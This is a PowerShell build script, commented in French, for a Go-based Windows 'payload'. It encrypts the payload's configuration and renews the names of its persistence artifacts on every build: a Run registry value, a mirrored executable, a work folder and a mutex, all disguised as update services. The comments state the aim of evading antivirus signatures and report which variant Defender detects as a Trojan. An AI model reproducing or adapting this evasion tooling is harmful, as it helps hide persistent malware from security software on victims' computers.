# build.ps1 - build du payload : config chiffree, empreintes renouvelees.
#
#   .\build.ps1                    # go build -H windowsgui (recommande)
#   .\build.ps1 -Garble            # garble -tiny -literals (voir note)
#   .\build.ps1 -Out "autre.exe"
#
# NOTE Garble : les binaires garble sont classes Trojan:Win32/Gracing.I et
# refuses a l'ecriture par Defender sur cette machine (test 21:39) — l'option
# reste fournie pour un environnement avec exclusion. Le build classique
# passe en temps reel car config chiffree + EncodedCommand + empreintes
# aleatoires couvrent les signatures.
#
# Chaque execution produit :
#   - payload.enc   (payload.json chiffre AES-256-GCM, via cmd/seal)
#   - quatre noms neufs (valeur Run, fichier miroir, dossier local, mutex)
#     transmis par -X : ce que l'antivirus a memorise comme signature ne
#     correspond plus a rien au build suivant.
param(
  [switch]$Garble,
  [string]$Out = "payload.exe"
)
$ErrorActionPreference = "Stop"
Set-Location -LiteralPath $PSScriptRoot

# 1. Configuration chiffree -------------------------------------------------
go run ./cmd/seal
if ($LASTEXITCODE -ne 0) { exit 1 }

# 2. Empreintes du build ----------------------------------------------------
$rnd = Get-Random -Minimum 100000 -Maximum 999999
$runName  = "UpdateCenter$rnd"
$mirror   = "UpdateSvc$rnd.exe"
$workDir  = "HostCache$rnd"
$mutex    = "Local\Instance$rnd"

$ld = "-H windowsgui -s -w -buildid=" +
  " -X main.runValueName=$runName" +
  " -X main.mirrorFileName=$mirror" +
  " -X main.workDirName=$workDir" +
  " -X main.instanceMutexName=$mutex"

# 3. Compilation ------------------------------------------------------------
$outAbs = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $Out))
if ($Garble) {
  $gopath = $env:GOPATH
  if (-not $gopath) { $gopath = Join-Path $env:USERPROFILE "go" }
  $garble = Join-Path $gopath "bin\garble.exe"
  if (-not (Test-Path $garble)) {
    Write-Output "build: garble introuvable -> go install mvdan.cc/garble@v0.17.0"
    exit 1
  }
  # -tiny : ni identifiant de build, ni horodatage ; -literals : les chaines
  # (URL, noms, cles) deviennent du code de dechiffrement au lieu de texte.
  & $garble -tiny -literals build -ldflags $ld -o $outAbs .
} else {
  go build -ldflags $ld -o $outAbs .
}
if ($LASTEXITCODE -ne 0) { exit 1 }

# 4. Empreinte conservee pour nettoyage (les anciens noms sont retires par
#    persistCleanupLegacy au prochain lancement).
@{ runValue = $runName; mirror = $mirror; workDir = $workDir; mutex = $mutex } |
  ConvertTo-Json | Set-Content -LiteralPath (Join-Path $PSScriptRoot "build-identity.json") -Encoding UTF8

$size = (Get-Item -LiteralPath $outAbs).Length
Write-Output ("build: OK -> " + $outAbs + " - " + $size + " octets")
Write-Output ("build: run=" + $runName + " mirror=" + $mirror + " dir=" + $workDir + " mutex=" + $mutex)
